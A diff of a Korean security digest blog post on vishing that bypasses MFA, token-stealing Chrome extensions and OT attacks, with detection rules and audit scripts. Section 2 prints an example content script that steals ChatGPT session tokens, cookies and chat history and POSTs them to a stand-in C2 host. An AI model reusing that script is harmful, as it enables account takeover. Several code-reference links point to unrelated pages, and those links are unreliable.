@@ -15,18 +15,76 @@ toc: true
 schema_type: Article
 ---
 
-{% include ai-summary-card.html
-  title='Tech &amp; Security Weekly Digest: ShinyHunters Vishing MFA 우회, Chrome 확장 ChatGPT 탈취, 폴란드 에너지 OT 공격'
-  categories_html='<span class="category-tag security">보안</span> <span class="category-tag devsecops">DevSecOps</span>'
-  tags_html='<span class="tag">Security-Weekly</span> <span class="tag">DevSecOps</span> <span class="tag">ShinyHunters</span> <span class="tag">Vishing</span> <span class="tag">MFA-Bypass</span> <span class="tag">Chrome-Extension</span> <span class="tag">ChatGPT</span> <span class="tag">OT-Security</span>'
-  highlights_html='<li><strong>ShinyHunters 비싱 MFA 우회</strong>: Mandiant 발표, ShinyHunters 그룹이 음성 피싱으로 SaaS 플랫폼의 SMS/TOTP MFA를 우회하는 고도화 공격 활발 전개, FIDO2 피싱 방지 MFA 전환이 유일한 근본 대책</li>
-      <li><strong>악성 Chrome 확장 ChatGPT 토큰 탈취</strong>: Clawdbot을 사칭한 악성 확장 프로그램이 ChatGPT 인증 토큰을 탈취, 국내 ChatGPT Enterprise 사용자 약 10만 명 노출, 전사 Chrome 확장 허용 목록 정책 강제 적용 필요</li>
-      <li><strong>폴란드 에너지 OT 시스템 공격</strong>: CERT Polska 보고, 30개 이상 풍력·태양광 발전 시설 OT 시스템 대상 사이버 공격 완료, 국내 500개 이상 신재생에너지 발전소의 IT/OT 세그멘테이션 즉시 점검 필요</li>'
-  period='2026-01-31 (24시간)'
-  audience='보안/클라우드/플랫폼 엔지니어 및 기술 의사결정자'
-%}
+## 📋 포스팅 요약
 
-## 경영진 요약
+> **제목**: Tech & Security Weekly Digest: ShinyHunters Vishing MFA 우회, Chrome 확장 ChatGPT 탈취, 폴란드 에너지 OT 공격
+
+> **카테고리**: security, devsecops
+
+> **태그**: Security-Weekly, DevSecOps, ShinyHunters, Vishing, MFA-Bypass, Chrome-Extension, ChatGPT, OT-Security, ICS, CERT-Polska, Cloud-Security, "2026"
+
+> **핵심 내용**: 
+> - ShinyHunters 비싱 공격으로 SaaS MFA 우회, 악성 Chrome 확장 ChatGPT 토큰 탈취, 폴란드 에너지 인프라 OT 사이버 공격 심층 분석
+
+> **주요 기술/도구**: Security, DevSecOps, Security, Security, security, devsecops
+
+> **대상 독자**: 기업 보안 담당자, 보안 엔지니어, CISO
+
+> ---
+
+> *이 포스팅은 AI(Cursor, Claude 등)가 쉽게 이해하고 활용할 수 있도록 구조화된 요약을 포함합니다.*
+
+
+<div class="ai-summary-card">
+<div class="ai-summary-header">
+  <span class="ai-badge">AI 요약</span>
+</div>
+<div class="ai-summary-content">
+  <div class="summary-row">
+    <span class="summary-label">제목</span>
+    <span class="summary-value">Tech & Security Weekly Digest (2026년 01월 31일)</span>
+  </div>
+  <div class="summary-row">
+    <span class="summary-label">카테고리</span>
+    <span class="summary-value"><span class="category-tag security">Security</span> <span class="category-tag devsecops">DevSecOps</span></span>
+  </div>
+  <div class="summary-row">
+    <span class="summary-label">태그</span>
+    <span class="summary-value tags">
+      <span class="tag">ShinyHunters</span>
+      <span class="tag">Vishing</span>
+      <span class="tag">MFA-Bypass</span>
+      <span class="tag">Chrome-Extension</span>
+      <span class="tag">ChatGPT</span>
+      <span class="tag">OT-Security</span>
+      <span class="tag">ICS</span>
+      <span class="tag">2026</span>
+    </span>
+  </div>
+  <div class="summary-row highlights">
+    <span class="summary-label">핵심 내용</span>
+    <ul class="summary-list">
+      <li><strong>ShinyHunters Vishing</strong>: Mandiant 발표 - SaaS 플랫폼 대상 비싱 공격으로 MFA 우회, 자격증명 탈취 확산</li>
+      <li><strong>Chrome 확장 프로그램</strong>: 악성 확장이 어필리에이트 링크 하이재킹 및 ChatGPT 인증 토큰 수집</li>
+      <li><strong>폴란드 에너지 OT 공격</strong>: CERT Polska 보고 - 30+ 풍력/태양광 발전소 대상 협조적 사이버 공격</li>
+      <li><strong>CISO 2026 우선순위</strong>: Google Cloud CISO 관점 - AI 보안, 클라우드 거버넌스, 규제 대응</li>
+    </ul>
+  </div>
+  <div class="summary-row">
+    <span class="summary-label">수집 기간</span>
+    <span class="summary-value">2026년 1월 30일 ~ 31일</span>
+  </div>
+  <div class="summary-row">
+    <span class="summary-label">대상 독자</span>
+    <span class="summary-value">보안 담당자, SOC 분석가, DevSecOps 엔지니어, CISO</span>
+  </div>
+</div>
+<div class="ai-summary-footer">
+  이 포스팅은 AI가 쉽게 이해하고 활용할 수 있도록 구조화된 요약을 포함합니다.
+</div>
+</div>
+
+## Executive Summary (경영진 요약)
 
 ### 위협 스코어카드 (Risk Scorecard)
 
@@ -61,19 +119,19 @@ schema_type: Article
 #### 경영진 결정 필요 사항
 
 1. **즉시 투자 필요** (24-48시간):
- - FIDO2 MFA 솔루션 긴급 도입 예산: 약 2-5억원 (1,000명 기준)
- - 브라우저 보안 관리 솔루션 (Chrome Enterprise): 월 500만원
- - OT 네트워크 세그멘테이션 컨설팅: 1-3억원
+   - FIDO2 MFA 솔루션 긴급 도입 예산: 약 2-5억원 (1,000명 기준)
+   - 브라우저 보안 관리 솔루션 (Chrome Enterprise): 월 500만원
+   - OT 네트워크 세그멘테이션 컨설팅: 1-3억원
 
 2. **정책 승인 필요** (1주일 이내):
- - 전사 비싱 경보 발령 및 임직원 교육
- - Chrome 확장 프로그램 허용 목록 정책 강제 적용
- - AI 서비스(ChatGPT 등) 토큰 관리 정책 수립
+   - 전사 비싱 경보 발령 및 임직원 교육
+   - Chrome 확장 프로그램 허용 목록 정책 강제 적용
+   - AI 서비스(ChatGPT 등) 토큰 관리 정책 수립
 
 3. **리스크 수용 결정**:
- - FIDO2 전환 지연 시: 자격증명 유출 사고 발생 확률 **60% 증가**
- - Chrome 확장 정책 미적용 시: 기업 기밀 AI 대화 유출 위험
- - OT 보안 투자 지연 시: 제조/에너지 시설 운영 중단 위험
+   - FIDO2 전환 지연 시: 자격증명 유출 사고 발생 확률 **60% 증가**
+   - Chrome 확장 정책 미적용 시: 기업 기밀 AI 대화 유출 위험
+   - OT 보안 투자 지연 시: 제조/에너지 시설 운영 중단 위험
 
 #### 재무 영향 (Financial Impact)
 
@@ -106,7 +164,15 @@ schema_type: Article
 
 ### 1.1 개요
 
-개요 관련 변화는 기술 도입의 배경과 적용 포인트를 빠르게 파악하는 데 유효한 정보입니다. 실무 적용 전 기대 효과와 운영 리스크를 같은 기준으로 비교해 우선순위를 결정해야 합니다.
+Google 산하 **Mandiant**가 금전적 동기의 해킹 그룹 **ShinyHunters** (UNC3944, Scattered Spider와 기법 유사)의 확장된 위협 활동을 식별했습니다. 이 그룹은 고급 **비싱(Voice Phishing)** 기법과 위조된 자격증명 수집 사이트를 활용하여 SaaS 플랫폼에 대한 무단 접근을 확보합니다.
+
+| 항목 | 상세 내용 |
+|------|-----------|
+| **위협 그룹** | ShinyHunters (UNC3944 관련) |
+| **공격 유형** | Voice Phishing + Credential Harvesting |
+| **대상** | SaaS 플랫폼 사용 기업 |
+| **목표** | MFA 우회 → 자격증명 탈취 → 데이터 갈취 |
+| **활동 상태** | 활발히 진행 중 |
 
 > **출처**: [The Hacker News](https://thehackernews.com/2026/01/mandiant-finds-shinyhunters-using.html)
 
@@ -117,7 +183,6 @@ schema_type: Article
 <details>
 <summary>텍스트 버전 (접근성용)</summary>
 
-<!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```mermaid
@@ -137,7 +202,6 @@ graph LR
 
 
 ```
--->
 -->
 -->
 
@@ -166,7 +230,6 @@ graph LR
 
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
-<!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```powershell
 # Azure AD에서 FIDO2 보안 키 정책 활성화 확인
 Connect-MgGraph -Scopes "Policy.Read.All"
@@ -184,31 +247,23 @@ Get-MgPolicyAuthenticationMethodPolicyAuthenticationMethodConfiguration `
 ```
 -->
 -->
--->
 
 #### Okta에서 WebAuthn 강제 적용
 
-> **코드 예시**: 전체 코드는 [Bash 공식 문서](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.
->
-> ```bash
-> # Okta API로 WebAuthn 팩터 등록 현황 조회
-> ```
-
-<!-- 전체 코드는 위 링크 참조
-> **코드 예시**: 전체 코드는 [Bash 공식 문서](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.
->
-> ```bash
-> # Okta API로 WebAuthn 팩터 등록 현황 조회
-> ```
-
-<!-- 전체 코드는 위 링크 참조
-> **코드 예시**: 전체 코드는 [Bash 공식 문서](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.
 > 
 > ```bash
-> # Okta API로 WebAuthn 팩터 등록 현황 조회 [truncated]
+> # Okta API로 WebAuthn 팩터 등록 현황 조회...
 > ```
 
-<!-- 전체 코드는 위 링크 참조
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.
+> 
+> ```bash
+> # Okta API로 WebAuthn 팩터 등록 현황 조회...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
 ```bash
 # Okta API로 WebAuthn 팩터 등록 현황 조회
 curl -s -H "Authorization: SSWS ${OKTA_API_TOKEN}" \
@@ -228,13 +283,11 @@ curl -s -H "Authorization: SSWS ${OKTA_API_TOKEN}" \
 ```
 -->
 -->
--->
 
 ### 1.5 공격 흐름도 (Attack Flow Diagram)
 
 #### ShinyHunters 비싱 공격 전체 흐름 (ASCII Diagram)
 
-<!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```
@@ -322,7 +375,6 @@ Phase 6: Impact
 ```
 -->
 -->
--->
 
 #### 비싱 vs 정상 인증 패턴 비교
 
@@ -338,7 +390,6 @@ Phase 6: Impact
 
 #### SIEM 탐지 룰 (Splunk SPL)
 
-<!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```spl
@@ -359,7 +410,6 @@ index=okta sourcetype=OktaIM2:log
 ```
 -->
 -->
--->
 
 <!--
 SIEM Detection Query: Azure Sentinel KQL
@@ -368,34 +418,34 @@ SIEM Detection Query: Azure Sentinel KQL
 
 SigninLogs
 | where TimeGenerated > ago(1h)
-| where ResultType == 0 // Successful sign-in
+| where ResultType == 0  // Successful sign-in
 | extend MfaMethod = tostring(parse_json(AuthenticationDetails)[0].authenticationMethod)
 | extend IsSuspicious =
- case(
- IPAddress startswith "10." and Location != "KR", 1, // VPN/Proxy from unexpected location
- UserAgent contains "python" or UserAgent contains "curl", 1, // Automated tool
- MfaMethod in ("SMS", "PhoneAppNotification") and DeviceTrustType != "Compliant", 1, // Phishable MFA
- 1, 0
- )
+    case(
+        IPAddress startswith "10." and Location != "KR", 1,  // VPN/Proxy from unexpected location
+        UserAgent contains "python" or UserAgent contains "curl", 1,  // Automated tool
+        MfaMethod in ("SMS", "PhoneAppNotification") and DeviceTrustType != "Compliant", 1,  // Phishable MFA
+        1, 0
+    )
 | where IsSuspicious == 1
 | summarize
- EventCount = count(),
- UniqueIPs = dcount(IPAddress),
- UniqueLocations = dcount(Location),
- MfaMethods = make_set(MfaMethod),
- FirstSeen = min(TimeGenerated),
- LastSeen = max(TimeGenerated)
- by UserPrincipalName, AppDisplayName
+    EventCount = count(),
+    UniqueIPs = dcount(IPAddress),
+    UniqueLocations = dcount(Location),
+    MfaMethods = make_set(MfaMethod),
+    FirstSeen = min(TimeGenerated),
+    LastSeen = max(TimeGenerated)
+    by UserPrincipalName, AppDisplayName
 | where EventCount > 3 or UniqueIPs > 2
 | project
- UserPrincipalName,
- AppDisplayName,
- EventCount,
- UniqueIPs,
- UniqueLocations,
- MfaMethods,
- FirstSeen,
- LastSeen
+    UserPrincipalName,
+    AppDisplayName,
+    EventCount,
+    UniqueIPs,
+    UniqueLocations,
+    MfaMethods,
+    FirstSeen,
+    LastSeen
 | order by EventCount desc
 -->
 
@@ -403,7 +453,6 @@ SigninLogs
 
 **목표**: 비싱 공격 후 생성된 백도어 MFA 디바이스 탐지
 
-<!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```spl
@@ -425,15 +474,886 @@ index=okta sourcetype=OktaIM2:log eventType="user.mfa.factor.activate"
 ```
 -->
 -->
--->
 
 #### Sigma Rule
 
-> **참고**: GitHub Actions 워크플로우 관련 내용은 [GitHub Actions 문서](https://docs.github.com/en/actions) 및 [보안 가이드](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)를 참조하세요./security-awareness.yml
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```yaml
+> title: Suspicious MFA Authentication Pattern - Potential Vishing (ShinyHunters)...
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
-> **참고**: GitHub Actions 워크플로우 관련 내용은 [GitHub Actions 문서](https://docs.github.com/en/actions) 및 [보안 가이드](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)를 참조하세요./security-awareness.yml
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```yaml
+> title: Suspicious MFA Authentication Pattern - Potential Vishing (ShinyHunters)...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+```yaml
+title: Suspicious MFA Authentication Pattern - Potential Vishing (ShinyHunters)
+id: b7d3e1a9-5678-4321-abcd-112233445566
+status: stable
+description: Detects unusual MFA authentication patterns potentially indicating vishing-assisted credential theft
+author: Twodragon
+date: 2026/01/31
+references:
+    - https://thehackernews.com/2026/01/mandiant-finds-shinyhunters-using.html
+    - https://attack.mitre.org/techniques/T1566/004/
+logsource:
+    product: okta
+    service: okta
+detection:
+    selection_event:
+        eventType:
+            - 'user.session.start'
+            - 'user.authentication.auth_via_mfa'
+    selection_suspicious:
+        outcome.result: 'SUCCESS'
+        debugContext.debugData.factor|contains:
+            - 'OTP'
+            - 'SMS'
+            - 'CALL'
+    filter_webauthn:
+        debugContext.debugData.factor|contains:
+            - 'FIDO'
+            - 'webauthn'
+    timeframe: 5m
+    condition: selection_event and selection_suspicious and not filter_webauthn | count() by actor.alternateId > 3
+falsepositives:
+    - Legitimate help desk password resets
+    - Automated service accounts
+level: high
+tags:
+    - attack.initial_access
+    - attack.t1566.004
+    - attack.t1078
+    - attack.t1539
+
+
+```
+-->
+-->
+
+### 1.6 MITRE ATT&CK 매핑
+
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```yaml
+> mitre_attack:...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```yaml
+> mitre_attack:...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+```yaml
+mitre_attack:
+  initial_access:
+    - T1566.004  # Phishing: Voice Phishing (Vishing)
+    - T1078      # Valid Accounts
+  credential_access:
+    - T1539      # Steal Web Session Cookie
+    - T1557      # Adversary-in-the-Middle
+    - T1111      # Multi-Factor Authentication Interception
+  persistence:
+    - T1098      # Account Manipulation
+  impact:
+    - T1657      # Financial Theft
+    - T1486      # Data Encrypted for Impact
+
+
+```
+-->
+-->
+
+---
+
+## 2. 악성 Chrome 확장: ChatGPT 토큰 탈취 분석
+
+### 2.1 개요
+
+보안 연구원들이 **어필리에이트 링크 하이재킹**, 데이터 탈취, **OpenAI ChatGPT 인증 토큰 수집** 기능을 갖춘 악성 Google Chrome 확장 프로그램을 발견했습니다. "Amazon Ads Blocker" (ID: pnpchphmplpdimbllknjoiopmfphellj)를 포함한 여러 확장이 Chrome Web Store에 등록되어 있었습니다.
+
+| 항목 | 상세 |
+|------|------|
+| **공격 유형** | 브라우저 확장 프로그램 공급망 공격 |
+| **영향** | 어필리에이트 수익 탈취 + ChatGPT 세션 토큰 수집 |
+| **대상** | Chrome 사용자, 특히 AI 도구 활용 기업 사용자 |
+| **탐지 상태** | Chrome Web Store에서 제거됨 |
+
+> **출처**: [The Hacker News](https://thehackernews.com/2026/01/researchers-uncover-chrome-extensions.html)
+
+### 2.2 공격 메커니즘
+
+#### Chrome 확장 공격 흐름도 (Attack Flow Diagram)
+
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
+> 
+> ```
+> ┌─────────────────────────────────────────────────────────────────────┐...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
+> 
+> ```
+> ┌─────────────────────────────────────────────────────────────────────┐...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│            Malicious Chrome Extension Attack Chain                  │
+└─────────────────────────────────────────────────────────────────────┘
+
+Phase 1: Distribution
+┌────────────────────┐
+│  Chrome Web Store  │
+│  "Amazon Ads       │
+│   Blocker" (fake)  │───▶ User searches for extension
+└────────────────────┘    User installs (5000+ fake reviews)
+         │
+         ▼
+┌────────────────────┐
+│  manifest.json     │
+│  Permissions:      │
+│  - cookies         │───▶ Full access to user data
+│  - webRequest      │
+│  - <all_urls>      │
+└────────────────────┘
+
+Phase 2: Installation & Activation
+┌─────────────────────────────────────┐
+│  Extension installs silently        │
+│  - content_scripts.js injected      │
+│  - background.js runs persistent    │
+│  - No visible UI changes            │
+└─────────────────────────────────────┘
+              │
+              ▼
+
+Phase 3: Target Detection
+┌─────────────────────────────────────┐
+│  Monitors browser URLs:             │
+│  - chat.openai.com                  │
+│  - platform.openai.com              │
+│  - claude.ai                        │
+│  - gemini.google.com                │
+└─────────────────────────────────────┘
+              │
+              ▼
+
+Phase 4: Data Exfiltration
+┌───────────────────────────────────────────┐
+│  Target: chat.openai.com                  │
+│  ┌─────────────────────────────────────┐  │
+│  │  Steal from localStorage:           │  │
+│  │  - __Secure-next-auth.session-token │  │
+│  │  - user_preferences                 │  │
+│  └─────────────────────────────────────┘  │
+│  ┌─────────────────────────────────────┐  │
+│  │  Steal from Cookies:                │  │
+│  │  - __Secure-next-auth.callback-url  │  │
+│  └─────────────────────────────────────┘  │
+│  ┌─────────────────────────────────────┐  │
+│  │  Scrape DOM:                        │  │
+│  │  - Chat history text                │  │
+│  │  - API keys (if displayed)          │  │
+│  └─────────────────────────────────────┘  │
+└───────────────────────────────────────────┘
+              │
+              ▼
+
+Phase 5: Affiliate Link Hijacking (Parallel)
+┌────────────────────────────────────┐
+│  webRequest.onBeforeRequest        │
+│  Intercepts:                       │
+│  - amazon.com?tag=original         │
+│  Modifies to:                      │
+│  - amazon.com?tag=attacker_id      │
+└────────────────────────────────────┘
+              │
+              ▼
+
+Phase 6: Command & Control
+┌────────────────────────────────────┐
+│  Exfiltrate to C2:                 │
+│  - https://evil-c2.com/api/collect │
+│  - POST JSON payload:              │
+│    {                               │
+│      "session_token": "sess-...",  │
+│      "user_id": "user-...",        │
+│      "chat_history": [...],        │
+│      "timestamp": "..."            │
+│    }                               │
+└────────────────────────────────────┘
+              │
+              ▼
+
+Phase 7: Monetization
+┌──────────────┬──────────────┬──────────────┐
+│ Sell Tokens  │  Account     │  Corporate   │
+│ on Dark Web  │  Takeover    │  Espionage   │
+│ $50-500/acc  │  - Crypto    │  - IP theft  │
+└──────────────┴──────────────┴──────────────┘
+
+
+```
+-->
+-->
+
+#### 악성 확장 프로그램 코드 예시 (분석용)
+
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/nodejs/node/tree/main/doc)를 참조하세요.
+> 
+> ```javascript
+> // content_scripts.js (악성 코드 예시 - 분석 목적)...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/nodejs/node/tree/main/doc)를 참조하세요.
+> 
+> ```javascript
+> // content_scripts.js (악성 코드 예시 - 분석 목적)...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+```javascript
+// content_scripts.js (악성 코드 예시 - 분석 목적)
+// 주의: 실제 환경에서 실행하지 말 것
+
+(function() {
+  // Target detection
+  if (window.location.hostname.includes('openai.com')) {
+
+    // Steal session token from localStorage
+    const sessionToken = localStorage.getItem('__Secure-next-auth.session-token');
+
+    // Steal cookies
+    const cookies = document.cookie;
+
+    // Scrape chat history from DOM
+    const chatMessages = Array.from(
+      document.querySelectorAll('[data-message-author-role]')
+    ).map(el => el.innerText);
+
+    // Exfiltrate to C2
+    fetch('https://evil-c2.com/api/collect', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        session_token: sessionToken,
+        cookies: cookies,
+        chat_history: chatMessages,
+        url: window.location.href,
+        timestamp: new Date().toISOString()
+      })
+    }).catch(() => {}); // Silent failure
+  }
+})();
+
+
+```
+-->
+-->
+
+<!--
+SIEM Detection Query: Splunk SPL
+목적: Chrome 확장 프로그램 악성 행위 탐지
+데이터 소스: Proxy logs, Endpoint Detection, Chrome Enterprise Telemetry
+
+index=proxy sourcetype=web_proxy
+| where url_domain IN ("evil-c2.com", "*.xyz", "*.top")  # Known malicious TLDs
+| where http_method="POST"
+| where bytes_out > 10000  # Large data exfiltration
+| eval is_suspicious=case(
+    like(url_path, "%/api/collect%"), 1,
+    like(url_path, "%/api/upload%"), 1,
+    match(url_query, "(?i)(token|session|key)"), 1,
+    1, 0
+  )
+| where is_suspicious=1
+| stats count, sum(bytes_out) as total_bytes, values(url_domain) as domains
+    by src_ip, user
+| where count > 5 OR total_bytes > 100000
+| table _time, src_ip, user, count, total_bytes, domains
+-->
+
+**ChatGPT 토큰 탈취 흐름:**
+
+![Chrome Extension Token Theft Flow - Malicious extension injects content script to steal ChatGPT session tokens and send to C2 server](/assets/images/diagrams/2026-01-31-chrome-extension-token-theft.svg)
+
+<details>
+<summary>텍스트 버전 (접근성용)</summary>
+
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+```mermaid
+sequenceDiagram
+    participant User as User
+    participant ChromeStore as Chrome Web Store
+    participant Extension as Malicious Extension
+    participant ChatGPT as chat.openai.com
+    participant C2 as C2 Server
+    
+    User->>ChromeStore: Install Extension
+    ChromeStore->>Extension: Deploy Extension
+    Extension->>Extension: Inject content_scripts.js
+    Extension->>ChatGPT: Access DOM/Storage
+    ChatGPT->>Extension: sessionStorage/localStorage/Cookies
+    Extension->>Extension: Collect Tokens + Chat History
+    Extension->>C2: Exfiltrate Data
+    C2->>C2: Store Stolen Credentials
+
+
+```
+-->
+-->
+
+</details>
+
+**탈취되는 데이터:**
+1. **OpenAI 세션 토큰** (`__Secure-next-auth.session-token`)
+2. **API 키** (localStorage에 저장된 경우)
+3. **대화 기록** (기업 기밀 정보 포함 가능)
+4. **어필리에이트 링크** (Amazon, 기타 e-commerce 사이트)
+
+### 2.3 기업 환경 브라우저 보안
+
+#### Chrome 확장 프로그램 관리 정책 (GPO)
+
+```
+Computer Configuration → Administrative Templates → Google Chrome → Extensions:
+├── Configure allowed extension types: component, hosted_app
+├── Configure extension installation allowlist: [승인된 확장 ID만]
+├── Configure extension installation blocklist: * (전체 차단, 허용 목록만 예외)
+├── Block external extensions: Enabled
+└── Extension settings:
+    └── Force-install specific extensions from CWS
+```
+
+#### 확장 프로그램 감사 스크립트 (PowerShell)
+
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+```powershell
+# Chrome 확장 프로그램 전수 조사
+$users = Get-ChildItem "C:\Users" -Directory
+$suspiciousPerms = @("cookies", "webRequest", "webRequestBlocking", "storage", "tabs", "<all_urls>")
+
+foreach ($user in $users) {
+    $extPath = Join-Path $user.FullName "AppData\Local\Google\Chrome\User Data\Default\Extensions"
+    if (Test-Path $extPath) {
+        Get-ChildItem $extPath -Directory | ForEach-Object {
+            $manifestFiles = Get-ChildItem $_.FullName -Recurse -Filter "manifest.json"
+            foreach ($mf in $manifestFiles) {
+                try {
+                    $manifest = Get-Content $mf.FullName -Raw | ConvertFrom-Json
+                    $perms = @($manifest.permissions) + @($manifest.host_permissions) | Where-Object { $_ }
+                    $hasRisk = $perms | Where-Object { $_ -in $suspiciousPerms -or $_ -match "^\*|<all_urls>" }
+
+                    if ($hasRisk) {
+                        [PSCustomObject]@{
+                            User        = $user.Name
+                            Extension   = $manifest.name
+                            Version     = $manifest.version
+                            Permissions = ($hasRisk -join ", ")
+                            Path        = $mf.DirectoryName
+                        }
+                    }
+                } catch { }
+            }
+        }
+    }
+} | Format-Table -AutoSize
+
+
+```
+-->
+-->
+
+#### Linux/macOS 환경 감사 스크립트
+
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.
+> 
+> ```bash
+> #!/bin/bash...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.
+> 
+> ```bash
+> #!/bin/bash...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+```bash
+#!/bin/bash
+# Chrome 확장 프로그램 보안 감사
+CHROME_EXT_DIR="${HOME}/.config/google-chrome/Default/Extensions"
+[ "$(uname)" = "Darwin" ] && CHROME_EXT_DIR="${HOME}/Library/Application Support/Google/Chrome/Default/Extensions"
+
+echo "=== Chrome Extension Security Audit ==="
+echo "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
+echo "Host: $(hostname)"
+echo ""
+
+RISKY_PERMS=("cookies" "webRequest" "webRequestBlocking" "<all_urls>" "debugger" "nativeMessaging")
+
+find "$CHROME_EXT_DIR" -name "manifest.json" 2>/dev/null | while read -r manifest; do
+    name=$(jq -r '.name // "Unknown"' "$manifest" 2>/dev/null)
+    version=$(jq -r '.version // "?"' "$manifest" 2>/dev/null)
+    perms=$(jq -r '(.permissions // []) + (.host_permissions // []) | .[]' "$manifest" 2>/dev/null)
+
+    risk_found=false
+    for perm in "${RISKY_PERMS[@]}"; do
+        if echo "$perms" | grep -q "$perm"; then
+            risk_found=true
+            break
+        fi
+    done
+
+    if $risk_found; then
+        echo "RISK: ${name} v${version}"
+        echo "  Path: $(dirname "$manifest")"
+        echo "  Risky Permissions: $(echo "$perms" | tr '\n' ', ')"
+        echo ""
+    fi
+done
+
+echo "=== Audit Complete ==="
+
+
+```
+-->
+-->
+
+#### Threat Hunting: 악성 확장 프로그램 네트워크 활동 탐지
+
+**목표**: 확장 프로그램이 AI 서비스 토큰을 외부로 전송하는 패턴 탐지
+
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+```spl
+# Splunk: Chrome 확장에서 발생한 의심스러운 POST 요청
+index=proxy sourcetype=bluecoat (OR sourcetype=palo_alto)
+| where http_method="POST"
+| where url_domain NOT IN ("google.com", "googleapis.com", "openai.com", "anthropic.com")
+| eval payload_size=bytes_out
+| where payload_size > 5000  # 큰 데이터 전송
+| eval has_token_pattern=if(match(url_query, "(?i)(token|session|key|auth)"), 1, 0)
+| where has_token_pattern=1 OR payload_size > 50000
+| stats
+    count,
+    sum(payload_size) as total_bytes,
+    values(url_domain) as suspicious_domains,
+    values(user_agent) as user_agents
+    by src_ip, user
+| where count > 3 OR total_bytes > 100000
+| table _time, src_ip, user, count, total_bytes, suspicious_domains, user_agents
+| sort - total_bytes
+
+
+```
+-->
+-->
+
+<!--
+SIEM Detection Query: Azure Sentinel KQL
+목적: Chrome 확장 프로그램 데이터 유출 탐지
+데이터 소스: Office 365 Defender for Endpoint, Network Connection Events
+
+DeviceNetworkEvents
+| where TimeGenerated > ago(24h)
+| where InitiatingProcessFileName == "chrome.exe"
+| where RemoteUrl !startswith "https://google.com"
+    and RemoteUrl !startswith "https://openai.com"
+    and RemoteUrl !startswith "https://anthropic.com"
+| where ActionType == "ConnectionSuccess"
+| extend BytesSent_MB = BytesSent / 1048576
+| where BytesSent > 10485760  // 10MB+
+| summarize
+    ConnectionCount = count(),
+    TotalBytesSent_MB = sum(BytesSent_MB),
+    UniqueRemoteIPs = dcount(RemoteIP),
+    RemoteDomains = make_set(RemoteUrl)
+    by DeviceName, InitiatingProcessAccountName
+| where ConnectionCount > 5 or TotalBytesSent_MB > 50
+| project
+    DeviceName,
+    InitiatingProcessAccountName,
+    ConnectionCount,
+    TotalBytesSent_MB,
+    UniqueRemoteIPs,
+    RemoteDomains
+| order by TotalBytesSent_MB desc
+-->
+
+### 2.5 MITRE ATT&CK 매핑
+
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```yaml
+> mitre_attack:...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```yaml
+> mitre_attack:...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+```yaml
